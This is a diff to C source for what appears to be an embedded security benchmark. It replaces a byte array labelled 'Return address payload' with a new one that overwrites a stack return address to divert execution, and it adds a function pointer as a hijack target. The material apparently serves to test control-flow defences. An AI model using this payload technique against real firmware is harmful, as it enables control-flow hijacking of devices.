@@ -658,13 +658,26 @@ struct DATA data[15] = { {1, 100},
        {17, 133},
        {18, 10} };
 
-char user_input[29] = {0x11, 0x22, 0x33, 0x44,
+/** Return address payload **/
+// char user_input[29] = {0x11, 0x22, 0x33, 0x44,
+//                       0x00, 0x00, 0x00, 0x00,
+//                       0x00, 0x02, 0x00, 0x00,
+//                       0x02, 0x00, 0x00, 0x00,
+//                       0x00, 0x00, 0x00, 0x00,
+//                       0xf0, 0xff, 0x03, 0x20,
+//                       0x25, 0x03, 0x04, 0x08, // address 8040324+1
+//                       1};
+
+ /** Return address payload **/
+char user_input[37] = {0x11, 0x22, 0x33, 0x44,
+                      0x04, 0x00, 0x00, 0x00,
+                      0x00, 0x00, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0x00,
                       0x00, 0x02, 0x00, 0x00,
-                      0x02, 0x00, 0x00, 0x00,
+                      0xe8, 0xff, 0x03, 0x20,
+                      0x7f, 0x03, 0x04, 0x08, 
                       0x00, 0x00, 0x00, 0x00,
-                      0xf0, 0xff, 0x03, 0x20,
-                      0x25, 0x03, 0x04, 0x08, // address 8040324+1
+                      0x79, 0x03, 0x04, 0x08, // address 8040378+1
                       1};
 
 void read_data(char * entry){
@@ -720,10 +733,32 @@ initialise_benchmark (void)
 {
 }
 
+int decision = 0;
 int result;
+
+void func1 ()
+{
+  result += 1;
+}
+
+void func2 ()
+{
+  result += 2;
+}
+
 void application()
 {
+  void (*fun_ptr)();
+
+  if(decision == 0){
+    fun_ptr = &func1;
+  } else{
+    fun_ptr = &func2;
+  }
+
   result = binary_search(8);
+  
+  fun_ptr();
   
   SECURE_record_output_data(result);
 }
